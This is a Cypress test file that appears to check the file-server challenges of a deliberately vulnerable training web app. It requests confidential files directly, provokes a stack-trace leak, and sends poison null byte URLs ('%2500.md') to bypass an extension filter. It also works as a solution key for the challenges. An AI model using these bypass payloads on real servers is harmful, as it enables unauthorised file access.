describe('/ftp', () => {
  describe('challenge "confidentialDocument"', () => {
    it('should be able to access file /ftp/acquisitions.md', () => {
      cy.request('/ftp/acquisitions.md')
      cy.expectChallengeSolved({ challenge: 'Confidential Document' })
    })
  })

  describe('challenge "errorHandling"', () => {
    it('should leak information through error message accessing /ftp/easter.egg due to wrong file suffix', () => {
      cy.visit('/ftp/easter.egg', { failOnStatusCode: false })

      cy.get('#stacktrace').then((elements) => {
        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
        expect(!!elements.length).to.be.true
      })
      cy.expectChallengeSolved({ challenge: 'Error Handling' })
    })
  })

  describe('challenge "forgottenBackup"', () => {
    it('should solve the challenge with a poison null byte attack on /ftp/coupons_2013.md.bak', () => {
      cy.request({ url: '/ftp/coupons_2013.md.bak%2500.md', failOnStatusCode: false }).its('status').should('equal', 403)
      cy.expectChallengeSolved({ challenge: 'Forgotten Sales Backup' })
    })
  })

  describe('challenge "forgottenDevBackup"', () => {
    it('should solve the challenge with a poison null byte attack on /ftp/package.json.bak', () => {
      cy.request({ url: '/ftp/package.json.bak%2500.md', failOnStatusCode: false }).its('status').should('equal', 403)
      cy.expectChallengeSolved({ challenge: 'Forgotten Developer Backup' })
    })
  })

  describe('challenge "easterEgg1"', () => {
    it('should solve the challenge with a poison null byte attack on /ftp/eastere.gg', () => {
      cy.request({ url: '/ftp/eastere.gg%2500.md', failOnStatusCode: false }).its('status').should('equal', 403)
      cy.expectChallengeSolved({ challenge: 'Easter Egg' })
    })
  })

  describe('challenge "misplacedSiemFileChallenge"', () => {
    it('should solve the challenge with a poison null byte attack on /ftp/suspicious_errors.yml', () => {
      cy.request({ url: '/ftp/suspicious_errors.yml%2500.md', failOnStatusCode: false }).its('status').should('equal', 403)
      cy.expectChallengeSolved({ challenge: 'Misplaced Signature File' })
    })
  })

  describe('challenge "nullByteChallenge"', () => {
    it('should solve the challenge with a poison null byte attack on /ftp/encrypt.pyc', () => {
      cy.request({ url: '/ftp/encrypt.pyc%2500.md', failOnStatusCode: false }).its('status').should('equal', 403)
      cy.expectChallengeSolved({ challenge: 'Poison Null Byte' })
    })
  })
})
